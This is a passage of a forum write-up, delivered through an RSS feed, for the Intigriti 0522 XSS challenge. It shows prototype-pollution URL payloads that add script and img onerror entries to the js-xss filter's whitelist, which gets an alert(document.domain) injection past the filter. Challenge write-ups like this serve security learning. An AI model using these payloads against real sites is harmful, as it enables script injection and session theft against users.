<a name="bypassing-the-xss-filter-5" class="anchor" href="https://0x00sec.org#bypassing-the-xss-filter-5"></a>Bypassing the XSS filter</h2>
<p>We have successfully injected a page in the pages’ prototype and then accessed it. However as <code>filterXSS</code> hints, there will be some XSS filtering. So let’s just try injecting some HTML and seeing how it gets filtered.<br>
<code>?page[__proto__][a]=&lt;img src%3Dx onerror%3D"alert(document.domain)"&gt;&amp;page=a</code></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/2/8/28033b463e0e8dfac7ea6b843a65c1842eab44d2.png" alt="" data-base62-sha1="5HY1nXpQ5XIP8FiNSGZ3FqaKEPE" width="406" height="154"></p>
<p>Let’s start by <a href="https://beautifier.io/" rel="noopener nofollow ugc">beautifying</a> <code>xss.js</code> and inspecting the <code>FilterXSS</code> function.</p>
<pre><code class="lang-javascript">function FilterXSS(options) {
    options = shallowCopyObject(options || {});
    if (options.stripIgnoreTag) {
        if (options.onIgnoreTag) {
            console.error('Notes: cannot use these two options "stripIgnoreTag" and "onIgnoreTag" at the same time')
        }
        options.onIgnoreTag = DEFAULT.onIgnoreTagStripAll
    }
    options.whiteList = options.whiteList || DEFAULT.whiteList;
    options.onTag = options.onTag || DEFAULT.onTag;
    options.onTagAttr = options.onTagAttr || DEFAULT.onTagAttr;
    options.onIgnoreTag = options.onIgnoreTag || DEFAULT.onIgnoreTag;
    options.onIgnoreTagAttr = options.onIgnoreTagAttr || DEFAULT.onIgnoreTagAttr;
    options.safeAttrValue = options.safeAttrValue || DEFAULT.safeAttrValue;
    options.escapeHtml = options.escapeHtml || DEFAULT.escapeHtml;
    this.options = options;
    if (options.css === false) {
        this.cssFilter = false
    } else {
        options.css = options.css || {};
        this.cssFilter = new FilterCSS(options.css)
    }
}
</code></pre>
<p>So as we can see there are quite a few options which we can set through prototype pollution. What really piqued my interest is the whiteList property. Let’s start by taking a look at what exactly it does.</p>
<pre><code class="lang-javascript">var retHtml = parseTag(html, function(sourcePosition, position, tag, html, isClosing) {
    var info = {
        sourcePosition: sourcePosition,
        position: position,
        isClosing: isClosing,
        isWhite: tag in whiteList // &lt;--------------- WHITELIST HERE
    };
    var ret = onTag(tag, html, info);
    if (!isNull(ret)) return ret;
    if (info.isWhite) {
        if (info.isClosing) {
            return "&lt;/" + tag + "&gt;"
        }
        var attrs = getAttrs(html);
        var whiteAttrList = whiteList[tag]; // &lt;----- WHITELIST HERE
        var attrsHtml = parseAttr(attrs.html, function(name, value) {
            var isWhiteAttr = _.indexOf(whiteAttrList, name) !== -1;
            var ret = onTagAttr(tag, name, value, isWhiteAttr);
            if (!isNull(ret)) return ret;
            if (isWhiteAttr) {
                value = safeAttrValue(tag, name, value, cssFilter);
                if (value) {
                    return name + '="' + value + '"'
                } else {
                    return name
                }
            } else {
                var ret = onIgnoreTagAttr(tag, name, value, isWhiteAttr);
                if (!isNull(ret)) return ret;
                return
            }
        });
        var html = "&lt;" + tag;
        if (attrsHtml) html += " " + attrsHtml;
        if (attrs.closing) html += " /";
        html += "&gt;";
        return html
    } else {
        var ret = onIgnoreTag(tag, html, info);
        if (!isNull(ret)) return ret;
        return escapeHtml(html)
    }
}, escapeHtml);
</code></pre>
<p>So interestingly, the <code>img</code> tag does not get filtered, it seems like the default whitelist allows this tag to pass through the XSS filter. However we can inject any tag by adding it to the prototype.</p>
<p><code>?page[__proto__][script]=1&amp;page[__proto__][a]=&lt;script&gt;alert(document.domain)&lt;/script&gt;&amp;page=a</code></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/9/6/96f511770c06d0ec86dbf5a79ec75af396150ce9.png" alt="" data-base62-sha1="lxqFXFvGfAniaVcwy949559ngnv" width="357" height="175"></p>
<p>However, scripts don’t get execute if they’re added with <code>.innerHTML</code> so we need to use a different tag. My goal is to inject the following piece of HTML code: <code>&lt;img src=x onerror="alert(document.domain)"&gt;</code>, which will execute if it’s added with <code>.innerHTML</code>. But as seen before, all tags get stripped, so let’s figure out how to bypass the tag whitelist.</p>
<pre><code class="lang-javascript">// tag = "img"
var whiteAttrList = whiteList[tag];
var isWhiteAttr = _.indexOf(whiteAttrList, name) !== -1;
</code></pre>
<p>So at first this seems like a problem, because <code>Array.indexOf</code> does not check the prototype of an array. However, even though <code>whiteAttrList</code> is presumed to be an array, it does not necessarily need to be. We can turn it into a string, which functions a lot like an array, which is why <code>Array.indexOf(string, needle)</code> will also work.</p>
<p>So let’s add <code>src</code> and <code>onerror</code> to the whitelist with the following parameter:<br>
<code>?page[__proto__][whiteList][img]=srconerror</code></p>
<p>So let’s try the previous payload with the bypass prepended.</p>
<p><code>?page[__proto__][whiteList][img]=srconerror&amp;page[__proto__][a]=&lt;img src%3Dx onerror%3D"alert(document.domain)"&gt;&amp;page=a</code></p>
<p><img src="https://0x00sec.org/images/emoji/twitter/sparkles.png?v=12" title=":sparkles:" class="emoji" alt=":sparkles:" loading="lazy" width="20" height="20">Success!<img src="https://0x00sec.org/images/emoji/twitter/sparkles.png?v=12" title=":sparkles:" class="emoji" alt=":sparkles:" loading="lazy" width="20" height="20"><br>
<img src="https://0x00sec.s3.amazonaws.com/original/3X/c/e/ce77fbfc935c69b917c8139cbb8521fd1f4892dd.png" alt="" data-base62-sha1="tsvqio3OHqm29tBGlekyygFQzZr" width="442" height="155"></p>
          <p><a href="https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592/1</link>
        <pubDate>Thu, 02 Jun 2022 22:11:41 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-29592-1</guid>
        <source url="https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592.rss">Intigriti XSS Challenge 0522 Writeup</source>
      </item>
  </channel>
</rss>
